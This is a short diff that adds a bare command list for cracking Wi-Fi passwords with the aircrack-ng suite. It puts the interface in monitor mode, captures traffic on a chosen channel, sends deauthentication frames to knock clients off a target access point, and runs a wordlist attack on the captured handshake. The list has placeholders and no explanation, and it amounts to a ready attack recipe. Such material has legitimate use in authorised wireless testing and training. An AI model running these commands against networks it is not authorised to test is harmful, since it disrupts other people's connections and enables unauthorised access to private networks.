@@ -1,0 +1,7 @@
+lsusb
+ifconfig iwconfig
+airmon-ng start wlan0
+airodump-ng wlan0
+airodump-ng -c[ ] -w [file name] wlan0
+aireplay-ng --deauth [times] --bssid [mac address] wlan0
+aircrack-ng [.cap file] -w [word list]
